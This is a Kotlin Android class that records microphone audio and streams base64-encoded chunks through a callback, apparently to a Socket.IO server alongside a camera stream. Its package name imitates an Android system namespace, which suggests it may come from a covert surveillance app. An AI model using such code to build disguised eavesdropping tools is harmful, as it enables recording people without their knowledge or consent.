package com.android.systemservices

import android.annotation.SuppressLint
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.media.audiofx.AcousticEchoCanceler
import android.media.audiofx.AutomaticGainControl
import android.media.audiofx.NoiseSuppressor
import android.util.Base64
import android.util.Log

class AudioStreamHelper {
    private val TAG = "AudioStreamHelper"

    companion object {
        const val SAMPLE_RATE = 16000
        // 512 ms per chunk → low latency while keeping Socket.IO payload reasonable
        private const val CHUNK_MS = 512
    }

    @Volatile var streaming = false
    @Volatile private var audioRecord: AudioRecord? = null
    private var thread: Thread? = null
    private var echoCanceler: AcousticEchoCanceler? = null
    private var noiseSuppressor: NoiseSuppressor? = null
    private var gainControl: AutomaticGainControl? = null

    @SuppressLint("MissingPermission")
    fun start(skipVoiceCommunication: Boolean = false, onChunk: (String) -> Unit) {
        if (streaming) return

        val minBuf = AudioRecord.getMinBufferSize(
            SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT
        )
        if (minBuf <= 0) {
            Log.e(TAG, "AudioRecord unsupported, minBuf=$minBuf")
            return
        }

        fun buildAr(source: Int) = try {
            AudioRecord(source, SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, maxOf(minBuf * 4, 8192))
        } catch (_: Exception) { null }

        // VOICE_COMMUNICATION can be blocked when Camera2 is simultaneously active on some HALs —
        // both at init time (guarded below) and, on some devices, intermittently at runtime too
        // (a likely cause of choppy audio while co-streaming with the camera). When the camera
        // stream is already active, skip straight to MIC instead of risking that contention.
        val ar = if (skipVoiceCommunication) {
            buildAr(MediaRecorder.AudioSource.MIC)
        } else {
            buildAr(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                ?.takeIf { it.state == AudioRecord.STATE_INITIALIZED }
                ?: run {
                    Log.w(TAG, "VOICE_COMMUNICATION unavailable, falling back to MIC")
                    buildAr(MediaRecorder.AudioSource.MIC)
                }
        }

        if (ar == null || ar.state != AudioRecord.STATE_INITIALIZED) {
            ar?.release()
            Log.e(TAG, "AudioRecord not initialized on any source")
            return
        }

        val sessionId = ar.audioSessionId
        if (AcousticEchoCanceler.isAvailable()) {
            echoCanceler = AcousticEchoCanceler.create(sessionId)?.apply { enabled = true }
            Log.i(TAG, "AEC enabled=${echoCanceler?.enabled}")
        }
        if (NoiseSuppressor.isAvailable()) {
            noiseSuppressor = NoiseSuppressor.create(sessionId)?.apply { enabled = false }
        }
        if (AutomaticGainControl.isAvailable()) {
            gainControl = AutomaticGainControl.create(sessionId)?.apply { enabled = true }
        }

        audioRecord = ar
        streaming = true

        try {
            ar.startRecording()
        } catch (e: Exception) {
            Log.e(TAG, "startRecording failed: ${e.message}")
            streaming = false
            ar.release()
            audioRecord = null
            return
        }

        val chunkSamples = SAMPLE_RATE * CHUNK_MS / 1000  // 8192 samples
        val readBuf = ShortArray(chunkSamples)

        thread = Thread {
            while (streaming) {
                val read = ar.read(readBuf, 0, chunkSamples)
                if (read > 0) {
                    // Int16 little-endian PCM → base64
                    val bytes = ByteArray(read * 2)
                    for (i in 0 until read) {
                        bytes[i * 2]     = (readBuf[i].toInt() and 0xFF).toByte()
                        bytes[i * 2 + 1] = ((readBuf[i].toInt() ushr 8) and 0xFF).toByte()
                    }
                    onChunk(Base64.encodeToString(bytes, Base64.NO_WRAP))
                } else if (read < 0) {
                    // AudioRecord.stop() was called — exit cleanly
                    break
                }
            }
        }.also {
            it.isDaemon = true
            it.name = "AudioStream"
            it.start()
        }
    }

    fun stop() {
        streaming = false
        val ar = audioRecord
        audioRecord = null
        try { ar?.stop() }    catch (_: Exception) {}
        try { ar?.release() } catch (_: Exception) {}
        echoCanceler?.release();   echoCanceler = null
        noiseSuppressor?.release(); noiseSuppressor = null
        gainControl?.release();    gainControl = null
        thread = null
    }

    fun setNoiseSuppressor(enabled: Boolean) {
        noiseSuppressor?.enabled = enabled
    }
}
